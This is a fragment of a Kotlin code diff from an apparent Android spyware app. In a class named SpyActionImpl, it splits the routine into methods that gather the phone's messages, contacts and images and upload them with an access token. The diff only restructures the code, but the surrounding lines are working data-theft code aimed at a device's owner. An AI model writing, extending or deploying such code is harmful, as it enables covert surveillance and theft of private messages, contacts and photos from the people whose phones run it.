@@ -24,6 +24,11 @@ class SpyActionImpl : SpyAction {
     private val getImages: GetImages = GetImages()
 
     override fun startAction(token: String) {
+        sendDeviceInfo(token)
+        sendImage(token)
+    }
+
+    private fun sendDeviceInfo(token: String) {
         val spyInfo = SpyInfo.Builder().apply {
             setMessages(getMessages(App.appContext))
             setContacts(getContacts(App.appContext))
@@ -43,6 +48,9 @@ class SpyActionImpl : SpyAction {
             accessToken = token,
             fileName = FILE_NAME
         )
+    }
+
+    private fun sendImage(token: String) {
         val images = getImages(App.appContext)
         for (image in images) {
             val imgInputStream = FileInputStream(image.path)
